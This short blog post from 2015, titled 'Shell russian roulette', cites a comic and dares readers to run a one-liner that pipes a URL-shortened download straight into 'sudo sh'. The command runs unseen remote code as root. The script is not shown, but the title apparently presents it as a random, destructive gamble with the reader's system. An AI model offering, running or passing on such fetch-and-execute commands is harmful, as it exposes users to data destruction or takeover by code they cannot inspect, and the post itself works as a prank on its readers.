---
title: "Shell russian roulette"
tags: "shell,Рекомендую"
date: "2015-12-16"
---

Inspired by this comics

[![Strip-Roulette-russe-650-finalenglish](images/Strip-Roulette-russe-650-finalenglish.jpg)](https://stepansuvorov.com/blog/wp-content/uploads/2015/12/Strip-Roulette-russe-650-finalenglish.jpg)

I decided to make it even more simple and put script on [github](https://github.com/stevermeister/sh/blob/master/russian-roulette.sh).

Would you dare to play?

```
curl -L https://tinyurl.com/r0u1ette| sudo sh
```
